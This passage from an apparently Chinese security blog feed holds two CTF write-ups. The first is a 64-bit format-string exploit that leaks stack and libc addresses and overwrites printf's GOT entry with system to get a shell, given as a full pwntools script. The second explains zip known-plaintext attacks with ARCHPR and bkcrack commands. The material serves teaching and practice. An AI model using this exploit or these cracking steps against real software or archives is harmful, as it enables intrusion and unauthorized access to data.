href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_15.png" alt="你想有多PWN-fmt_test2_15.png"></p><hr><h1 id="fmt-str-level-1-x64"><a href="#fmt-str-level-1-x64" class="headerlink" title="fmt_str_level_1_x64"></a>fmt_str_level_1_x64</h1><blockquote><p>主要在 <em>“定位并泄露栈中的数据”</em> 和 <em>“利用 libc 偏移计算 system 地址”</em> 两节中与 32 位程序有所区别</p></blockquote><hr><h2 id="定位并泄露栈中的数据-1"><a href="#定位并泄露栈中的数据-1" class="headerlink" title="定位并泄露栈中的数据"></a>定位并泄露栈中的数据</h2><p>准备工作与前面一样，就不再详细说明了</p><p>首先调试 <code>fmt_str_level_1_x64</code> 程序，在 <code>read()</code> 处输入：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaaaaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看输出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_19.png" alt="你想有多PWN-fmt_test2_19.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaaaaaa_0x55555555600b_0x71_0xffffffff_0x6_0x7ffff7fc9040_0x6161616161616161_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0x255f70255f70255f_0xa70255f70_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到 <code>0x6161616161616161</code> 位于第 6 个位置，即 RSP 所指向的位置（<mark>因为在 64 位程序中 printf 函数的前 6 个参数位于寄存器中，第 7 个参数才开始入栈；而 32 位程序 printf 函数的参数都存放在栈中，这是 64 位程序与 32 位程序不同的地方</mark>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_20.png" alt="你想有多PWN-fmt_test2_20.png"></p><p>与 32 位程序同理，计算可知栈中的返回地址位于：<code>6 + (0x7fffffffdad8 - 0x7fffffffd9c0) / 8 = 6 + 35 = 41</code></p><p>构造 <code>printf(%41$p)</code> 即可泄露出 <code>main+28</code> 的真实地址，于是 <code>main()</code> 的真实地址为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">28</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用-ELF-的函数偏移计算真实地址-1"><a href="#利用-ELF-的函数偏移计算真实地址-1" class="headerlink" title="利用 ELF 的函数偏移计算真实地址"></a>利用 ELF 的函数偏移计算真实地址</h2><p>与 32 位一样，根据 ELF 的函数偏移地址计算 <code>puts_got_addr</code> 和 <code>printf_got_addr</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用-libc-偏移计算-system-地址-1"><a href="#利用-libc-偏移计算-system-地址-1" class="headerlink" title="利用 libc 偏移计算 system 地址"></a>利用 libc 偏移计算 system 地址</h2><p>要使用 libc 计算偏移，首先需要知道一个调用自 libc 的函数的真实地址</p><p>这里还是选择通过 <code>puts_got_addr</code> 泄露真实 <code>puts()</code> 地址作为示例</p><blockquote><p><em>注意：这里与 32 位程序有所不同！！！</em></p><p><mark>如果依然使用类似于 32 位程序中的方法，在接收地址时会发生错误：</mark></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%6$s'</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>  puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然说我们接收到的数据 <code>0x3a7475706e69</code> 来自 <code>69 6e 70 75 74 3a</code>（小端序）没有问题，但实际上 <code>puts()</code> 的真实地址是错误的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_21.png" alt="你想有多PWN-fmt_test2_21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_22.png" alt="你想有多PWN-fmt_test2_22.png"></p><p>原因在于：</p><ul><li><strong>32 位程序的地址占 4 字节，通常 4 字节全部被使用</strong></li><li><strong>64 位程序的地址虽然占 8 字节，但通常只使用了其中的 6 字节</strong></li></ul><p>实际 <code>puts_got_addr</code> 的地址 <code>0x56c4b37f8020</code> 只使用了 6 字节，这就导致我们在发送 <code>p64(puts_got_addr)</code> 的时候，高位 2 字节被补为 <code>0x00</code>，最后的地址为：<code>0x000056c4b37f8020</code></p><p>即上图桃红色方框中的：<code>20 80 7f b3 c4 56 00 00</code>（小端序）</p><p>而这里的 <code>0x00</code> 会导致我们发送的 payload 被截断，因此无法达到 <code>printf(%6$s)</code> 的效果</p></blockquote><p>所以这里为了避免被截断，我们不能在 <code>%参数顺序$格式化说明符</code> 之前发送 <code>p64(puts_got_addr)</code></p><p>应该先发送 <code>%参数顺序$格式化说明符</code>，再发送 <code>p64(puts_got_addr)</code></p><p>于是栈中的结构应该变为：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_23.png" alt="你想有多PWN-fmt_test2_23.png"></p><p>因为先发送 <code>%参数顺序$格式化说明符</code>，所以 <code>p64(puts_got_addr)</code> 应该位于第 7 个位置，将原来的 <code>b&#39;%6$s&#39;</code> 改为 <code>b&#39;%7$s&#39;</code></p><p><strong>同时，64 位程序一个地址存放 8 字节，而 <code>b&#39;%7$s&#39;</code> 只有 4 字节，因此还需要填补 4 字节的垃圾数据，例如：<code>b&#39;%7$saaaa&#39;</code></strong></p><p>因此脚本应该改为：</p> <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> <span class="token string">b'%7$saaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 此时泄漏的地址位于最开始，因此直接从第一个字节开始接收</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_24.png" alt="你想有多PWN-fmt_test2_24.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_25.png" alt="你想有多PWN-fmt_test2_25.png"></p><p>可以看到这次没有被 <code>0x00</code> 截断，<code>puts()</code> 的真实地址也是正确的</p><p>其他的基本与 32 位一样，最后使用 <code>fmtstr_payload()</code> 时将偏移改为 6 即可</p><h2 id="完整脚本-1"><a href="#完整脚本-1" class="headerlink" title="完整脚本"></a>完整脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 泄露并计算 main 函数真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">28</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 main 函数的真实地址计算 puts 函数的 GOT 表地址</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> <span class="token string">b'%7$saaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span>  io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 此时泄漏的地址位于最开始，因此直接从第一个字节开始接收</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 puts 函数的真实地址与 libc 偏移计算 system 函数地址</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6')</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libcbase -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_26.png" alt="你想有多PWN-fmt_test2_26.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_27.png" alt="你想有多PWN-fmt_test2_27.png"></p>]]></content>
    
    
    <summary type="html">一个格式化字符串漏洞的例题，包括泄露栈空间的数据、通过栈上的返回地址推算其它函数的真实地址、利用 libc 偏移计算 system 与 &quot;/bin/sh&quot;，以及通过 fmtstr_payload 将 printf 的 GOT 表地址修改为 system_plt，需注意 32 位与 64 位的区别</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="格式化字符串" scheme="https://www.uf4te.cn/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>明文攻击</title>
    <link href="https://www.uf4te.cn/posts/3a71eb8.html"/>
    <id>https://www.uf4te.cn/posts/3a71eb8.html</id>
    <published>2024-04-09T02:52:54.000Z</published>
    <updated>2024-06-05T06:34:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zip-明文攻击"><a href="#zip-明文攻击" class="headerlink" title="zip 明文攻击"></a>zip 明文攻击</h1><blockquote><p>zip 明文攻击是针对加密 zip 压缩包的一种高效攻击手段，由于同一个 zip 压缩包里的所有文件都是使用同一个加密密钥来加密的，因此可以利用压缩包中的某个已知文件，在不知道解压密码的情况下还原出压缩包中的所有文件</p><p><em>zip 传统加密算法本质上是伪随机数流和明文进行异或，产生这个伪随机流需要用到 3 个 32 bits 的 key，找到这 3 个 key，就能解开加密的文件</em>。如果可以获得加密压缩包中的任意一个文件，用同样的压缩方法进行无密码的压缩，分析无密码 zip 和有密码 zip 的不同之处就能得到 3 个 key，进而在不知道解压密码的情况下获取加密压缩包中的文件</p></blockquote><h2 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h2><blockquote><p><strong>使用 ARCHPR 进行明文攻击时，首先需要确定明文文件与加密的 zip 压缩包中的文件是否为同一个文件</strong>，另外，<mark>压缩包要采用 ZipCrypto 类（如：Store）算法，不能采用 AES-256 加密</mark></p></blockquote><h3 id="确定明文文件"><a href="#确定明文文件" class="headerlink" title="确定明文文件"></a>确定明文文件</h3><p>例如，获取到一个没有密码的明文文件 <code>readme.txt</code>，且文件大小大于 12 Byte：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB2.png" alt="CTF-Misc_明文攻击2.png"></p><p>发现加密的压缩包 <code>Desktop.zip</code> 中同样有一个名为 <code>readme.txt</code> 的文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB3.png" alt="CTF-Misc_明文攻击3.png"></p><p><strong>为了确定它们是否是同一个文件，可以通过 WinRAR、7-Zip 等解压软件来查看 CRC 值</strong></p><p>可以看到加密的 <code>Desktop.zip</code> 中 <code>readme.txt</code> 的 CRC 值为 <code>E615BDA4</code>，算法为 <code>ZipCrypto Store</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB1.png" alt="CTF-Misc_明文攻击1.png"></p><p>然后将 <code>readme.txt</code> 压缩为 zip 压缩包（<em>需与加密压缩包内的 <code>readme.txt</code> 压缩格式一致</em>），文件名随意，我这里命名为 <code>readme.zip</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB4.png" alt="CTF-Misc_明文攻击4.png"></p><p>可以看到这两个 <code>readme.txt</code> 文件的 CRC 值都是 <code>E615BDA4</code>，基本可以确定是同一个文件</p><hr><h3 id="使用-ARCHPR-明文攻击"><a href="#使用-ARCHPR-明文攻击" class="headerlink" title="使用 ARCHPR 明文攻击"></a>使用 ARCHPR 明文攻击</h3><p>打开 ARCHPR，选择明文攻击，导入对应文件</p><p><em>明文文件就是将 <code>readme.txt</code> 压缩后的 <code>readme.zip</code></em></p><blockquote><p>如果在使用明文攻击的时候，ARCHPR 出现这种报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在选定的档案中没有匹配的文件。如果您想要仅使用文件的一部分执行明文攻击，请修改档案，使每个档案中只包含一个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能是压缩软件的问题，<strong>构造明文压缩包时要选用与加密压缩包相同的压缩软件，例如加密压缩包是通过 WinRAR 压缩的，用 7-Zip 制作明文压缩包，可能会出现报错的情况</strong>，请尝试更换压缩软件</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB5.png" alt="CTF-Misc_明文攻击5.png"></p><blockquote><p><mark>注意：这里不需要等到 ARCHPR 破解的进度条走完</mark></p><p><strong>明文攻击时长一般在 5 - 10 分钟，运行至 5 分钟左右可以手动停止</strong></p></blockquote><p>如果手动停止时 ARCHPR 还没有找到密钥，则会显示“被用户终止”，此时只需再次点击“开始”，等待几分钟后再次手动停止，重复此操作</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB8.png" alt="CTF-Misc_明文攻击8.png"></p><p>如果手动停止时 ARCHPR 已经找到密钥，会弹出一个窗口，显示加密密钥的三个 key 值，我这里是 <code>[ df96dc88 b432ddfd df4b9e93 ]</code>，虽然文件口令未找到，但不要紧</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB6.png" alt="CTF-Misc_明文攻击6.png"></p><p>点击右边的确定后，ARCHPR 会自动弹出一个保存文件的窗口，文件名为 <code>Desktop_decrypted.zip</code>，这个压缩包就是去除了加密的 <code>Desktop.zip</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB7.png" alt="CTF-Misc_明文攻击7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB9.png" alt="CTF-Misc_明文攻击9.png"></p><p>直接正常解压 <code>Desktop_decrypted.zip</code> 即可获得加密的 <code>Desktop.zip</code> 中的所有文件</p><hr><h2 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h2><blockquote><p>使用 bkcrack 可以不需要明文文件，只需要知道加密压缩包内容的连续 12 字节（至少 12 字节，知道得越多破解得越快），即可进行明文攻击，压缩包要采用 ZipCrypto 类（如：Store）算法</p><p>下载地址：<a href="https://github.com/kimci86/bkcrack/releases">kimci86&#x2F;bkcrack: Crack legacy zip encryption with Biham and Kocher’s known plaintext attack.</a></p></blockquote><p>常用参数：</p><table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-L</td><td align="left">查看压缩包中的内容</td></tr><tr><td align="left">-C</td><td align="left">加密的压缩包</td></tr><tr><td align="left">-c</td><td align="left">压缩包内加密的文件（参照 <code>bkcrack -L</code> 中的 <code>Name</code> 项来写）</td></tr><tr><td align="left">-p</td><td align="left">明文内容（无需压缩为 zip）</td></tr><tr><td align="left">-k</td><td align="left">输入 key</td></tr><tr><td align="left">-x</td><td align="left">偏移量</td></tr><tr><td align="left">-d</td><td align="left">攻击完成后导出解密文件</td></tr><tr><td align="left">-U</td><td align="left">去除源密码按照指定的新密码保存压缩包</td></tr></tbody></table><ol><li>查看压缩包中的内容</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-L</span> zip压缩包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB10.png" alt="CTF-Misc_明文攻击10.png"></p><ol start="2"><li>根据明文文件获取加密压缩包的三个密钥 key</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zip加密压缩包 <span class="token parameter variable">-c</span> zip加密压缩包内的文件 <span class="token parameter variable">-p</span> 明文文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB11.png" alt="CTF-Misc_明文攻击11.png"></p><ol start="3"><li>还原加密压缩包中的内容</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bkcrack <span class="token parameter variable">-C</span> zip加密压缩包 <span class="token parameter variable">-c</span> zip加密压缩包内的文件<span class="token punctuation">(</span>想要还原的<span class="token punctuation">)</span> <span class="token parameter variable">-k</span> key1 key2 key3 <span class="token parameter variable">-d</span> 还原后保存的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 